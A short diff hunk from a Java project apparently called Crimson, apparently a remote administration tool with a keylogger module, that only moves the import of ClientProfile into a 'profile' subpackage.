@@ -27,8 +27,8 @@ import com.subterranean_security.crimson.core.stream.StreamStore;
 import com.subterranean_security.crimson.core.util.IDGen;
 import com.subterranean_security.crimson.server.ServerStore;
 import com.subterranean_security.crimson.server.net.Receptor;
-import com.subterranean_security.crimson.sv.ClientProfile;
 import com.subterranean_security.crimson.sv.keylogger.LogCallback;
+import com.subterranean_security.crimson.sv.profile.ClientProfile;
 
 public class SubscriberSlave extends Stream {
 
